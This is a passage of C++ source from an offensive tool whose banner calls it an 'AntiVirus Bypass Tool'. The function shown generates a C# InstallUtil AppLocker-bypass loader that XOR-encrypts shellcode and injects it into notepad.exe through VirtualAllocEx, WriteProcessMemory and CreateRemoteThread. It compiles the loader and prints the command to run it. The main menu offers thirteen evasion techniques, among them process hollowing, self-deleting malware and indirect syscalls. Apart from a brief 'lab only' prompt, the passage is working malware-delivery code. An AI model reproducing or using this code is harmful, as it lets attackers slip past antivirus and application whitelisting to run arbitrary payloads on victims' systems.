void applocker_installutil2() {
    std::cout << GREEN << BOLD << "[*] Starting applocker_installutil2..." << RESET << std::endl;

    // Read the payload file
    std::vector<unsigned char> content = readBinaryFile(payload_name);

    // Generate random key and encrypt content
    std::vector<unsigned char> key = generateRandomKey(16);
    std::vector<unsigned char> ciphertext = xorEncrypt(content, key);

    // Convert to hex strings for C# code
    std::string ciphertext_str = bytesToHexString(ciphertext);
    std::string key_str = bytesToHexString(key);

    // Create the C# code with the encrypted shellcode and key
    // This version is optimized for larger shellcode
    std::string installutil = 
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "using System.Configuration.Install;\n"
        "using System.Diagnostics;\n"
        "using System.IO;\n"
        "\n"
        "public class Program\n"
        "{\n"
        "    public static void Main()\n"
        "    {\n"
        "        Console.WriteLine(\"Nothing to see here...\");\n"
        "    }\n"
        "}\n"
        "\n"
        "public class Bypass : System.Configuration.Install.Installer\n"
        "{\n"
        "    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n"
        "    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);\n"
        "\n"
        "    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n"
        "    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n"
        "\n"
        "    [DllImport(\"kernel32.dll\")]\n"
        "    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);\n"
        "\n"
        "    [DllImport(\"kernel32.dll\")]\n"
        "    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);\n"
        "\n"
        "    [DllImport(\"kernel32.dll\", SetLastError = true)]\n"
        "    static extern bool CloseHandle(IntPtr hObject);\n"
        "\n"
        "    public override void Uninstall(System.Collections.IDictionary savedState)\n"
        "    {\n"
        "        string targetProcess = \"notepad.exe\"; // Target process\n"
        "        byte[] encryptedShellcode = new byte[] { " + ciphertext_str + " };\n"
        "\n"
        "        byte[] key = new byte[] { " + key_str + " };\n"
        "\n"
        "        // Decrypt the shellcode using XOR\n"
        "        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];\n"
        "\n"
        "        // Optimized decryption for large shellcode\n"
        "        for (int i = 0; i < encryptedShellcode.Length; i++)\n"
        "        {\n"
        "            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ key[i % key.Length]);\n"
        "        }\n"
        "\n"
        "        Process process = Process.Start(targetProcess);\n"
        "        System.Threading.Thread.Sleep(1000); // Give process time to start\n"
        "\n"
        "        IntPtr hProcess = OpenProcess(0x1F0FFF, false, process.Id);\n"
        "\n"
        "        // Allocate memory with execute/read/write permissions\n"
        "        IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decryptedShellcode.Length, 0x3000, 0x40);\n"
        "\n"
        "        // Write shellcode to process memory in chunks if needed\n"
        "        IntPtr bytesWritten;\n"
        "        WriteProcessMemory(hProcess, allocatedMemory, decryptedShellcode, (uint)decryptedShellcode.Length, out bytesWritten);\n"
        "\n"
        "        // Create remote thread to execute shellcode\n"
        "        IntPtr threadHandle;\n"
        "        CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out threadHandle);\n"
        "\n"
        "        CloseHandle(hProcess);\n"
        "    }\n"
        "}\n";

    // Write C# code to file
    std::ofstream csFile("applocker2.cs");
    csFile << installutil;
    csFile.close();

    // Compile the code
    int result = system("mcs -r:System.Configuration.Install.dll applocker2.cs");

    if (result == 0) {
        std::cout << GREEN << BOLD << "[*] Payload successfully created as applocker2.exe" << RESET << std::endl;
        std::cout << GREEN << BOLD << "[*] Run this command 'c:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U applocker2.exe'" << RESET << std::endl;
    } else {
        std::cerr << "Error: Compilation failed" << std::endl;
        std::cerr << "Make sure to run 'sudo apt install mono-complete' before using option 10" << std::endl;
    }

    // Clean up temporary files
    std::vector<std::string> files = {"applocker2.cs"};
    for (const auto& file : files) {
        removeFile(file);
    }
}

// Function declarations
void HAVOCone();
void HAVOCtwo();
void HAVOCfour();
void HAVOCsixAES_withhollow();
void HAVOCseven_dynamic_sai();
void HAVOCeightAES_hollow_dll();
void HAVOCnine_enc();
void powershell_havocevery();
void enumpagew();
void indirect();
void indirect2();
void applocker_installutil();
void applocker_installutil2();

// Main function
int main(int argc, char* argv[]) {
    // Display banner
    std::string banner = RED + BOLD + R"(

░▒▓███████▓▒░ ░▒▓███████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░              ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░        ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓███████▓▒░░▒▓███████▓▒░          ░▒▓██▓▒░  ░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░

)" + WHITE + BOLD + "................................................" + RED + BOLD + R"(
                      AntiVirus Bypass Tool (v.0.2.1)
---------------------------------------------------------
)" + MAGENTA + BOLD + "Created by Sai" + RED + BOLD + R"(
---------------------------------------------------------
)" + WHITE + BOLD + "................................................" + RED + BOLD + "\n";

    std::cout << banner << std::endl;

    std::string options;
    std::cout << WHITE << BOLD << "You sure you want to Continue?(Use it ethically, and in lab enviroments only) y/n: ";
    std::cin >> options;

    if (options == "y" || options == "Y") {
        std::string havoc;
        std::cout << WHITE << BOLD << "Enter your payload choice:\n"
                  << "1.)self-injection(XOR)\n"
                  << "2.)self-injection(AES)\n"
                  << "3.)Process Injection(spoolsv)(Can be used for lateral movement)\n"
                  << "4.)Process Hollow\n"
                  << RED << BOLD << "5.)Self Deleting Malware(HAVE TO WAIT, CLOSE TO A MINUTE FOR THE PAYLOAD TO EXECUTE)" << WHITE << BOLD << "\n"
                  << "6.)DLL side-load/rundll32 applocker bypass\n"
                  << "7.)Process Injection(explorer.exe)\n"
                  << RED << BOLD << "8.)Powershell(Will bypass with cloud detections enabled as well)(Make sure to run this payload twice)(use x64 payload only)" << WHITE << BOLD << "\n"
                  << "9.)AppLocker bypass (InstallUtil)\n"
                  << "10.)AppLocker bypass for large shellcode (InstallUtil)\n"
                  << "11.)Indirect syscalls\n"
                  << "12.)EnumPageFile callback function\n"
                  << "13.)Indirect syscalls with kernel32 and ntdll\n"
                  << RESET
                  << ">";
        std::cin >> havoc;

        std::cout << "Please type in the shellcode file name: ";
        std::cin >> payload_name;

        if (havoc == "1") {
            std::cout << "Selected self-injection(XOR)" << std::endl;
            HAVOCone();
        } else if (havoc == "2") {
            std::cout << "Selected self-injection(AES)" << std::endl;
            HAVOCtwo();
        } else if (havoc == "3") {
            std::cout << "Selected Process Injection(spoolsv)" << std::endl;
            HAVOCfour();
        } else if (havoc == "4") {
            std::cout << "Selected Process Hollow" << std::endl;
            HAVOCsixAES_withhollow();
        } else if (havoc == "5") {
            std::cout << "Selected Self Deleting Malware" << std::endl;
            HAVOCseven_dynamic_sai();
        } else if (havoc == "6") {
            std::cout << "Selected DLL side-load/rundll32 applocker bypass" << std::endl;
            HAVOCeightAES_hollow_dll();
        } else if (havoc == "7") {
            std::cout << "Selected Process Injection(explorer.exe)" << std::endl;
            HAVOCnine_enc();
        } else if (havoc == "8") {
            std::cout << "Selected Powershell" << std::endl;
            powershell_havocevery();
        } else if (havoc == "9") {
            std::cout << "Selected AppLocker bypass (InstallUtil)" << std::endl;
            applocker_installutil();
        } else if (havoc == "10") {
            std::cout << "Selected AppLocker bypass for large shellcode (InstallUtil)" << std::endl;
            applocker_installutil2();
        } else if (havoc == "11") {
            std::cout << "Selected indirect payload" << std::endl;
            indirect();
        } else if (havoc == "12") {
            std::cout << "Selected enumpagefile call back function payload" << std::endl;
            enumpagew();
        } else if (havoc == "13") {
            std::cout << "Selected indirect2 payload" << std::endl;
            indirect2();
        } else {
            std::cout << "Invalid option" << std::endl;
            return 1;
        }
    } else if (options == "n" || options == "N") {
        return 0;
    }

    return 0;
}
